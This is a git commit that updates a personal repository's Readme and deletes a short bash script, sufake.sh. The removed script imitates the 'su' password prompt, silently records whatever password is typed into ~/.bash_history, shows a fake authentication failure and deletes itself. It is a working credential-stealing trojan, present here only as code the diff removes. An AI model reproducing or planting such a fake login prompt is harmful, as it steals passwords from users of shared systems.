fe5512f05d0e5c7743f8c01a67b2e567075a4023
maus- <maus.stearns@gmail.com>
2013-01-23 02:33:23 -0800

    Updated Readme / Removed a script

--- Readme.md
+++ Readme.md
@@ -2,5 +2,5 @@
 ###What is the porpoise? 
 
 1. A method to familiarize myself with git.
-2. A place to drop quick shellscripts.
+2. A place to drop random shell snippets
 
--- sufake.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-printf "Password: "
-read -s password
-printf "\n# %s %s" $1 $password >> ~/.bash_history
-sleep 4
-printf "\nsu: Authentication Failure"
-rm $0
